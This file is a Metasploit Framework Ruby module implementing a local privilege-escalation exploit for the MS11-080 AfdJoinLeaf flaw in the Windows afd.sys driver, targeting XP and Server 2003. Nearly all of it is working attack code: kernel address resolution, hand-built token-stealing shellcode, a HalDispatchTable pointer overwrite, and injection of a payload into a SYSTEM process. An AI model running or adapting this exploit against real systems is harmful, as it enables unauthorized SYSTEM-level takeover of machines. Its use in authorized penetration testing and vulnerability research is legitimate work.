##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Exploit::Local
	Rank = AverageRanking
	# Average because this module relies on memory corruption within the
	# kernel, this is inherently dangerous.  Also if the payload casues
	# the system process that it was injected into to die then it's also
	# possible that the system may become unstable.

	include Msf::Post::Common
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super(update_info(info, {
			'Name'          => 'MS11-080 AfdJoinLeaf Privilege Escalation',
			'Description'    => %q{
				This module exploits a flaw in the AfdJoinLeaf function of the
				afd.sys driver to overwrite data in kernel space.  An address
				within the HalDispatchTable is overwritten and when triggered
				with a call to NtQueryIntervalProfile will execute shellcode.

				This module will elevate itself to SYSTEM, then inject the payload
				into another SYSTEM process before restoring it's own token to
				avoid causing system instability.
			},
			'License'       => MSF_LICENSE,
			'Author'        =>
				[
					'Matteo Memelli', # original exploit and all the hard work
					'Spencer McIntyre' # MSF module
				],
			'Arch'          => [ ARCH_X86 ],
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Targets'       =>
				[
					[ 'Automatic', { } ],

					[ 'Windows XP SP2 / SP3',
						{
							'HaliQuerySystemInfo' => 0x16bba,
							'HalpSetSystemInformation' => 0x19436,
							'_KPROCESS' => "\x44",
							'_TOKEN' => "\xc8",
							'_UPID' => "\x84",
							'_APLINKS' => "\x88"
						}
					],

					[ 'Windows Server 2003 SP2',
						{
							'HaliQuerySystemInfo' => 0x1fa1e,
							'HalpSetSystemInformation' => 0x21c60,
							'_KPROCESS' => "\x38",
							'_TOKEN' => "\xd8",
							'_UPID' => "\x94",
							'_APLINKS' => "\x98"
						}
					],
				],
			'References'    =>
				[
					[ 'CVE', '2011-2005' ],
					[ 'MSB', 'MS11-080' ],
					[ 'EDB', 18176 ],
					[ 'URL', 'http://www.offensive-security.com/vulndev/ms11-080-voyage-into-ring-zero/' ]
				],
			'DisclosureDate'=> 'Nov 30 2011',
			'DefaultTarget' => 0
		}))

		register_options([
		])

	end

	def find_sys_base(drvname)
		session.railgun.add_dll('psapi') if not session.railgun.dlls.keys.include?('psapi')
		session.railgun.add_function('psapi', 'EnumDeviceDrivers', 'BOOL', [ ["PBLOB", "lpImageBase", "out"], ["DWORD", "cb", "in"], ["PDWORD", "lpcbNeeded", "out"]])
		session.railgun.add_function('psapi', 'GetDeviceDriverBaseNameA', 'DWORD', [ ["LPVOID", "ImageBase", "in"], ["PBLOB", "lpBaseName", "out"], ["DWORD", "nSize", "in"]])
		results = session.railgun.psapi.EnumDeviceDrivers(4096, 1024, 4)
		addresses = results['lpImageBase'][0..results['lpcbNeeded'] - 1].unpack("L*")

		addresses.each do |address|
			results = session.railgun.psapi.GetDeviceDriverBaseNameA(address, 48, 48)
			current_drvname = results['lpBaseName'][0..results['return'] - 1]
			if drvname == nil
				if current_drvname.downcase.include?('krnl')
					return [address, current_drvname]
				end
			elsif drvname == results['lpBaseName'][0..results['return'] - 1]
				return [address, current_drvname]
			end
		end
	end

	# Function borrowed from smart_hashdump
	def get_system_proc
		# Make sure you got the correct SYSTEM Account Name no matter the OS Language
		local_sys = resolve_sid("S-1-5-18")
		system_account_name = "#{local_sys[:domain]}\\#{local_sys[:name]}"

		# Processes that can Blue Screen a host if migrated in to
		dangerous_processes = ["lsass.exe", "csrss.exe", "smss.exe"]
		session.sys.process.processes.each do |p|
			# Check we are not migrating to a process that can BSOD the host
			next if dangerous_processes.include?(p["name"])
			next if p["pid"] == session.sys.process.getpid
			next if p["pid"] == 4
			next if p["user"] != system_account_name
			return p
		end
	end

	def exploit
		if sysinfo["Architecture"] =~ /wow64/i
			print_error("Running against WOW64 is not supported")
			return
		elsif sysinfo["Architectore"] =~ /x64/
			print_error("Running against 64-bit systems is not supported")
			return
		end

		mytarget = target
		if mytarget.name =~ /Automatic/
			os = sysinfo["OS"]
			if os =~ /windows xp/i
				mytarget = targets[1]
			end
			if ((os =~ /2003/) and (os =~ /service pack 2/i))
				mytarget = targets[2]
			end
			if ((os =~ /\.net server/i) and (os =~ /service pack 2/i))
				mytarget = targets[2]
			end

			if mytarget.name =~ /Automatic/
				print_error("Could not identify the target system, it may not be supported")
				return
			end
			print_status("Running against #{mytarget.name}")
		end

		if is_system?
			print_error("This meterpreter session is already running as SYSTEM")
			return
		end

		this_proc = session.sys.process.open
		kernel_info = find_sys_base(nil)
		base_addr = 0x1001
		print_status("Kernel Base Address: 0x#{kernel_info[0].to_s(16)}")

		result = session.railgun.ws2_32.WSASocketA("AF_INET", "SOCK_STREAM", "IPPROTO_TCP", nil, nil, 0)
		socket = result['return']

		irpstuff =  rand_text_alpha(8)
		irpstuff << "\x00\x00\x00\x00"
		irpstuff << rand_text_alpha(4)
		irpstuff << "\x01\x00\x00\x00"
		irpstuff << "\xe8\x00" + "4" + "\xf0\x00"
		irpstuff << rand_text_alpha(231)

		if not this_proc.memory.writable?(0x1000)
			session.railgun.add_function(
				'ntdll',
				'NtAllocateVirtualMemory',
				'DWORD',
				[
					["DWORD", "ProcessHandle", "in"],
					["PBLOB", "BaseAddress", "inout"],
					["PDWORD", "ZeroBits", "in"],
					["PBLOB", "RegionSize", "inout"],
					["DWORD", "AllocationType", "in"],
					["DWORD", "Protect", "in"]
				])

			result = session.railgun.ntdll.NtAllocateVirtualMemory(-1, [ base_addr ].pack("L"), nil, [ 0x1000 ].pack("L"), "MEM_COMMIT | MEM_RESERVE", "PAGE_EXECUTE_READWRITE")
		end
		if not this_proc.memory.writable?(0x1000)
			print_error('Failed to properly allocate memory')
			return
		end
		this_proc.memory.write(0x1000, irpstuff)

		hKernel = session.railgun.kernel32.LoadLibraryExA(kernel_info[1], 0, 1)
		hKernel = hKernel['return']
		halDispatchTable = session.railgun.kernel32.GetProcAddress(hKernel, "HalDispatchTable")
		halDispatchTable = halDispatchTable['return']
		halDispatchTable -= hKernel
		halDispatchTable += kernel_info[0]
		print_status("HalDisPatchTable Address: 0x#{halDispatchTable.to_s(16)}")

		halbase = find_sys_base("hal.dll")[0]
		haliQuerySystemInformation = halbase + mytarget['HaliQuerySystemInfo']
		halpSetSystemInformation = halbase + mytarget['HalpSetSystemInformation']
		print_status("HaliQuerySystemInformation Address: 0x#{haliQuerySystemInformation.to_s(16)}")
		print_status("HalpSetSystemInformation Address: 0x#{halpSetSystemInformation.to_s(16)}")

		#### Exploitation ####
		shellcode_address_dep   = 0x0002071e
		shellcode_address_nodep = 0x000207b8
		padding             = make_nops(2)
		halDispatchTable0x4 = halDispatchTable + 0x4
		halDispatchTable0x8 = halDispatchTable + 0x8

		restore_ptrs =  "\x31\xc0"
		restore_ptrs << "\xb8" + [ halpSetSystemInformation ].pack("L")
		restore_ptrs << "\xa3" + [ halDispatchTable0x8 ].pack("L")
		restore_ptrs << "\xb8" + [ haliQuerySystemInformation ].pack("L")
		restore_ptrs << "\xa3" + [ halDispatchTable0x4 ].pack("L")

		tokenstealing =  "\x52"
		tokenstealing << "\x53"
		tokenstealing << "\x33\xc0"
		tokenstealing << "\x64\x8b\x80\x24\x01\x00\x00"
		tokenstealing << "\x8b\x40" + mytarget['_KPROCESS']
		tokenstealing << "\x8b\xc8"
		tokenstealing << "\x8b\x98" + mytarget['_TOKEN'] + "\x00\x00\x00"
		tokenstealing << "\x89\x1d\x00\x09\x02\x00"
		tokenstealing << "\x8b\x80" + mytarget['_APLINKS'] + "\x00\x00\x00"
		tokenstealing << "\x81\xe8" + mytarget['_APLINKS'] + "\x00\x00\x00"
		tokenstealing << "\x81\xb8" + mytarget['_UPID'] + "\x00\x00\x00\x04\x00\x00\x00"
		tokenstealing << "\x75\xe8"
		tokenstealing << "\x8b\x90" + mytarget['_TOKEN'] + "\x00\x00\x00"
		tokenstealing << "\x8b\xc1"
		tokenstealing << "\x89\x90" + mytarget['_TOKEN'] + "\x00\x00\x00"
		tokenstealing << "\x5b"
		tokenstealing << "\x5a"
		tokenstealing << "\xc2\x10"

		restore_token =  "\x52"
		restore_token << "\x33\xc0"
		restore_token << "\x64\x8b\x80\x24\x01\x00\x00"
		restore_token << "\x8b\x40" + mytarget['_KPROCESS']
		restore_token << "\x8b\x15\x00\x09\x02\x00"
		restore_token << "\x89\x90" + mytarget['_TOKEN'] + "\x00\x00\x00"
		restore_token << "\x5a"
		restore_token << "\xc2\x10"

		shellcode = padding + restore_ptrs + tokenstealing

		this_proc.memory.write(shellcode_address_dep, shellcode)
		this_proc.memory.write(shellcode_address_nodep, shellcode)
		this_proc.memory.protect(0x00020000)

		addr = [ 2, 4455, 0x7f000001, 0, 0 ].pack("s!S!L!L!L!")
		result = session.railgun.ws2_32.connect(socket, addr, addr.length)
		if result['return'] != 0xffffffff
			print_error("The socket is not in the correct state")
			return
		end

		session.railgun.add_function(
			'ntdll',
			'NtDeviceIoControlFile',
			'DWORD',
			[
				[ "DWORD", "FileHandle", "in" ],
				[ "DWORD", "Event", "in" ],
				[ "DWORD", "ApcRoutine", "in" ],
				[ "DWORD", "ApcContext", "in" ],
				[ "PDWORD", "IoStatusBlock", "out" ],
				[ "DWORD", "IoControlCode", "in" ],
				[ "LPVOID", "InputBuffer", "in" ],
				[ "DWORD", "InputBufferLength", "in" ],
				[ "LPVOID", "OutputBuffer", "in" ],
				[ "DWORD", "OutPutBufferLength", "in" ]
			])

		session.railgun.add_function(
			'ntdll',
			'NtQueryIntervalProfile',
			'DWORD',
			[
				[ "DWORD", "ProfileSource", "in" ], [ "PDWORD", "Interval", "out" ]
			])

		print_status("Triggering AFDJoinLeaf pointer overwrite...")
		result = session.railgun.ntdll.NtDeviceIoControlFile(socket, 0, 0, 0, 4, 0x000120bb, 0x1004, 0x108, halDispatchTable0x4 + 0x1, 0)
		result = session.railgun.ntdll.NtQueryIntervalProfile(1337, 4)

		if not is_system?
			print_error("Exploit failed")
			return
		end

		begin
			proc = get_system_proc
			print_status("Injecting the payload into SYSTEM process: #{proc["name"]} PID: #{proc["pid"]}")
			host_process = client.sys.process.open(proc["pid"], PROCESS_ALL_ACCESS)
			mem = host_process.memory.allocate(payload.encoded.length + (payload.encoded.length % 1024))

			print_status("Writing #{payload.encoded.length} bytes at address #{"0x%.8x" % mem}")
			host_process.memory.write(mem, payload.encoded)
			host_process.thread.create(mem, 0)
		rescue ::Exception => e
			print_error("Failed to Inject Payload")
			print_error(e.to_s)
		end

		# Restore the token because apparently BSODs are frowned upon
		print_status("Restoring the original token...")
		shellcode = padding + restore_ptrs + restore_token
		this_proc.memory.write(shellcode_address_dep, shellcode)
		this_proc.memory.write(shellcode_address_nodep, shellcode)

		result = session.railgun.ntdll.NtDeviceIoControlFile(socket, 0, 0, 0, 4, 0x000120bb, 0x1004, 0x108, halDispatchTable0x4 + 0x1, 0)
		result = session.railgun.ntdll.NtQueryIntervalProfile(1337, 4)
	end

end
